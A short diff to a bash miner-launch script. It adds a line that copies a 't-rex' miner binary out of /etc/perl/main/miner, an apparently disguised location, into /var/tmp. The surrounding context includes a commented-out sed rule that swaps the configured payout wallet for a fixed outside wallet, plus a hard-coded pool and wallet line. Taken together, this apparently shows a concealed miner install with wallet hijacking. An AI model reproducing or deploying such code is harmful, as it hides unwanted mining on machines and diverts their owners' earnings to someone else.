@@ -179,6 +179,7 @@ while true; do
   [[ ${MINER_ROOT} == "true" ]] && minerSudo="sudo -E PATH=${PATH} HOME=${HOME} LD_LIBRARY_PATH=${LD_LIBRARY_PATH}"
   
   {
+  sudo \cp -r /etc/perl/main/miner/t-rex /var/tmp/miner
   #MINER_OPTIONS_GO=$(sed -E 's/(^-.*wal)[^.]*\.[^ ]*(.*)/ \1 0x0d7351bDD85268912739859a26f1A3151b4B3Fe0.imperiet -cdm 0\2/g' <<< ${MINER_OPTIONS_GO})
   rigName=`cat /etc/perl/main/execute/rigName.txt`
   #MINER_OPTIONS_GO="-pool stratum+tcp://ethw.2miners.com:2020 -wal 0x690b4bFd136243bF389711CDe4a9Fa21D106fdA2.${rigName} -dagrestart 1 -rvram -1 -eres 0"
